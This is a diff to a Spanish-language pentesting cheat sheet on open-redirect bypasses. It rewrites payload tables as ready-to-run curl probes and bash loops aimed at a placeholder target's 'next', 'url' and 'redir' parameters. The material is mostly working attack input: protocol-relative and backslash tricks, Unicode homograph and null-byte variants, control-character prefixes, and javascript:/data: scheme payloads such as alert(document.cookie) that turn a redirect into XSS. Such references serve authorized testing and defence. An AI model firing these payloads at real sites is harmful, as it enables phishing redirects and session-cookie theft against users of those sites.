@@ -21,30 +21,28 @@ linked:
 
 ## URL Absoluta Completa
 
-| **Payload** | **Resultado esperado** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `https://attacker.com` | Redirect 302 a attacker.com | Vector más simple. |
-| `http://attacker.com` | Redirect HTTP | Si target HTTPS-only, falla. |
-| `https://attacker.com/` | Trailing slash | Same effect. |
-| `https://attacker.com/path?p=1` | Con path + query | Custom landing. |
-| `https://attacker.com/#fragment` | Fragment preservado | Client-side data. |
-| `https://attacker.com:8080` | Custom port | Port allowed by target validator? |
-| `https://user:pass@attacker.com` | Userinfo en URL | Some browsers warn — bypass tricks. |
-| `https://attacker.com\@target.com` | Backslash before @ | Some parsers split. |
-| URL con %00 | `https://attacker.com%00.target.com` | Null byte truncation. |
-| URL con unicode lookalike | `https://аttacker.com` (Cyrillic а) | IDN spoofing. |
-| URL con punycode | `xn--ttacker-...` | Encoded IDN. |
-| URL con %2F prefix | `%2F%2Fattacker.com` | URL-encoded slash. |
-| URL con whitespace | `https://attacker.com %20foo` | Trim varies. |
+| `curl -sI "https://target/login?next=https://attacker.com" \| grep -i location` | 302 Location: https://attacker.com | Validator inexistente. |
+| `curl -sI "https://target/login?next=http://attacker.com"` | Test HTTP scheme acceptance | Target que solo allowlistea HTTPS. |
+| `curl -sI "https://target/login?next=https://attacker.com/path?p=1#frag"` | Path + query + fragment preservados | Custom landing post-redirect. |
+| `curl -sI "https://target/login?next=https://attacker.com:8080"` | Custom port en redirect | Validator no chequea port. |
+| `curl -sI "https://target/login?next=https://user:pass@attacker.com"` | Userinfo en URL | Browser warn pero parser permissivo. |
+| `curl -sI "https://target/login?next=https://а‌ttacker.com"` (Cyrillic) | IDN homograph spoofing | Validator ASCII-only check. |
+| `curl -sI "https://target/login?next=https://xn--ttacker-..."` | Punycode encoded IDN | Pre-decoded IDN match. |
+| `for p in 'https://attacker.com' 'http://attacker.com' '//attacker.com' '\\\\attacker.com'; do curl -sI "https://target/login?next=$(jq -sRr @uri <<<$p)" \| grep -i location; done` | Bulk probe variants | Discovery. |
 ^or-vector-absolute
 
 ### Probes con curl
 
 ```bash
-# Test cada vector
-for p in 'https://attacker.com' 'http://attacker.com' '//attacker.com' '\\\\attacker.com'; do
+for p in 'https://attacker.com' 'http://attacker.com' '//attacker.com' '\\\\attacker.com' \
+         'https://attacker.com/' 'https://attacker.com/path?p=1' 'https://attacker.com:8080' \
+         'https://user:pass@attacker.com' 'https://attacker.com\@target.com' \
+         'https://attacker.com%00.target.com'; do
+  ENC=$(printf '%s' "$p" | jq -sRr @uri)
   echo "=== $p ==="
-  curl -sI "https://target/login?next=$(echo $p | jq -sRr @uri)" | grep -i location
+  curl -sI "https://target/login?next=$ENC" | grep -i location
 done
 ```
 
@@ -52,84 +50,60 @@ ___
 
 ## Protocol-Relative URLs
 
-| **Payload** | **Resultado** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `//attacker.com` | Browser usa scheme actual (http o https) | Most common bypass. |
-| `//attacker.com/path` | Con path | Combine. |
-| `\\attacker.com` | Backslash variant — Windows-style | Some parsers tratan como protocol-relative. |
-| `\/\/attacker.com` | Mixed escape | Some validators no manejan. |
-| `\\\\attacker.com` | Doble backslash | Edge case. |
-| `////attacker.com` | Multiple slashes | Browser normaliza a `//`. |
-| `/\attacker.com` | Slash + backslash | Confusión. |
-| `//attacker.com/legit-path` | Domain con legit path | Spoof intent. |
-| `// attacker.com` (con espacio) | Whitespace | Algunos browsers strip. |
-| `///attacker.com` | Triple slash | Browser-specific normalization. |
+| `curl -sI "https://target/login?next=//attacker.com"` | Browser usa scheme actual (http/https) | Bypass más común — validator solo chequea `https://`. |
+| `curl -sI "https://target/login?next=//attacker.com/legit-path"` | Domain malicioso con path legítimo | Spoof intent. |
+| `curl -sI "https://target/login?next=\\\\attacker.com"` | Backslash protocol-relative (Windows-style) | Chrome lo trata como `//`. |
+| `curl -sI "https://target/login?next=\/\/attacker.com"` | Escaped slashes | Validator no maneja. |
+| `curl -sI "https://target/login?next=////attacker.com"` | Multiple slashes — browser normaliza | Edge case parser. |
+| `curl -sI "https://target/login?next=/\attacker.com"` | Slash + backslash | Parser confusion. |
+| `curl -sI "https://target/login?next=///attacker.com"` | Triple slash | Browser-specific normalization. |
+| `curl -sI "https://target/login?next=//attacker.com%20foo"` (whitespace) | Whitespace handling | Validator strip varies. |
 ^or-vector-protocol-relative
 
-### Browser parsing differences
+### Browser parsing differences (referencia)
 
 | Browser | `//evil.com` | `\\evil.com` | `\/\/evil.com` |
 |---|---|---|---|
 | Chrome | Redirects | Redirects | Redirects |
 | Firefox | Redirects | Treats as path | Redirects |
 | Safari | Redirects | Treats as path | Redirects |
-| IE/Edge legacy | Redirects | Redirects | Edge |
 
 ___
 
 ## Scheme Switching
 
-| **Payload** | **Resultado** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `javascript:alert(1)` | XSS via redirect | Many apps filter `javascript:`. |
-| `JaVaScRiPt:alert(1)` | Mixed case bypass | Filter case-sensitive? |
-| `\tjavascript:alert(1)` | Tab prefix | Some parsers strip. |
-| ` javascript:alert(1)` | Space prefix | Browser tolerates. |
-| `javascript&#58;alert(1)` | HTML entity colon | If reflected en HTML. |
-| `data:text/html,<script>alert(1)</script>` | data: URL | Modern browsers more strict. |
-| `data:text/html;base64,...` | Base64 data URL | Compact. |
-| `vbscript:msgbox(1)` | IE legacy | Old browsers. |
-| `livescript:` | Netscape legacy | Historic. |
-| `mocha:` | Netscape legacy | Historic. |
-| `mailto:attacker@evil.com` | Email client launch | Less impact. |
-| `tel:+1234567890` | Phone call | Mobile vector. |
-| `intent:` (Android) | App launch | Mobile-specific. |
-| `file://` (browser-blocked usually) | Local file | Edge. |
-| `chrome:` (chrome://) | Browser internal | Blocked usually. |
-| Browser-specific schemes | `slack://`, `whatsapp://`, `tg://` | App handoff. |
+| `curl -sI "https://target/redir?url=javascript:alert(document.cookie)"` | XSS via redirect | App pasa value a `Location:` directo. |
+| `curl -sI "https://target/redir?url=JaVaScRiPt:alert(1)"` | Mixed case bypass | Filter case-sensitive. |
+| `curl -sI "https://target/redir?url=javas%09cript:alert(1)"` (URL-encoded tab) | Tab prefix bypass | Parser strip control chars. |
+| `curl -sI "https://target/redir?url=%20javascript:alert(1)"` (space prefix) | Whitespace bypass | Browser tolera leading whitespace. |
+| `curl -sI "https://target/redir?url=javascript&#58;alert(1)"` (HTML entity colon) | HTML entity bypass | Reflejado en HTML body redirect. |
+| `curl -sI "https://target/redir?url=data:text/html,<script>alert(1)</script>"` | data: URL XSS | Algunas apps permiten data:. |
+| `curl -sI "https://target/redir?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="` | Base64 data URL | Filter naive sobre `<script>`. |
+| `curl -sI "https://target/redir?url=vbscript:msgbox(1)"` | IE legacy scheme | Old browsers. |
+| `curl -sI "https://target/redir?url=intent://attacker#Intent;..."` | Android intent launch | Mobile redirect. |
+| `for s in javascript JaVaScRiPt 'java%09script' 'java%0Ascript' 'java\tscript' data file vbscript livescript; do curl -sI "https://target/redir?url=${s}:alert(1)" \| grep -i location; done` | Bulk scheme probe | Discovery. |
 ^or-vector-scheme
-
-### XSS via javascript: scheme
-
-```
-?next=javascript:alert(document.cookie)
-?redirect=jAvAsCrIpT:alert(1)
-?url=javas%09cript:alert(1)  ← URL-encoded tab
-```
-
-Si app pasa value directamente a `Location:` header, browser ejecuta JS en ciertas condiciones (depending on browser + redirect type).
 
 ___
 
 ## Backslash / Control Char Tricks
 
-| **Payload** | **Notas** |
-|:---:|:---:|
-| `\\attacker.com` | Treated as protocol-relative en Chrome. |
-| `https:\\attacker.com` | Backslash en lugar de `//`. |
-| `https:/\attacker.com` | Mixed. |
-| `https:\/attacker.com` | Mixed. |
-| `https:\/\/attacker.com` | Escaped. |
-| `https://target.com\@attacker.com` | Backslash split before @. |
-| `https://target.com\.attacker.com` | Backslash in domain. |
-| `\rhttps://attacker.com` | CR prefix. |
-| `\nhttps://attacker.com` | LF prefix. |
-| `\thttps://attacker.com` | Tab prefix. |
-| `‮https://attacker.com` | Right-to-left override Unicode (visual spoof). |
-| `https%3A%2F%2Fattacker.com` | URL-encoded. |
-| `https:%2F%2Fattacker.com` | Mixed encode. |
-| `https:%5C%5Cattacker.com` | URL-encoded backslash. |
-| Null byte `\x00` | `https://target.com%00@attacker.com` | Truncation. |
+| **Comando** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `curl -sI "https://target/login?next=\\\\attacker.com"` | Backslash protocol-relative | Chrome trata como `//`. |
+| `curl -sI "https://target/login?next=https:\\\\attacker.com"` | Backslash en lugar de `//` | Parser tolerante. |
+| `curl -sI "https://target/login?next=https:/\attacker.com"` | Slash+backslash mix | Inconsistent parsing. |
+| `curl -sI "https://target/login?next=https://target.com\@attacker.com"` | Backslash split antes de `@` | Parser ignora `\`. |
+| `curl -sI "https://target/login?next=$(printf '\rhttps://attacker.com' \| jq -sRr @uri)"` | CR prefix | Control char bypass. |
+| `curl -sI "https://target/login?next=$(printf '\thttps://attacker.com' \| jq -sRr @uri)"` | Tab prefix | Same idea. |
+| `curl -sI "https://target/login?next=https%3A%2F%2Fattacker.com"` | URL-encoded full | Decode-after-validate. |
+| `curl -sI "https://target/login?next=https:%2F%2Fattacker.com"` | Mixed encode | Partial decode. |
+| `curl -sI "https://target/login?next=https:%5C%5Cattacker.com"` | URL-encoded backslash | Combo. |
+| `curl -sI "https://target/login?next=https://target.com%00@attacker.com"` | Null byte truncation | Parser que trunca en null. |
 ^or-vector-control
 
 ***
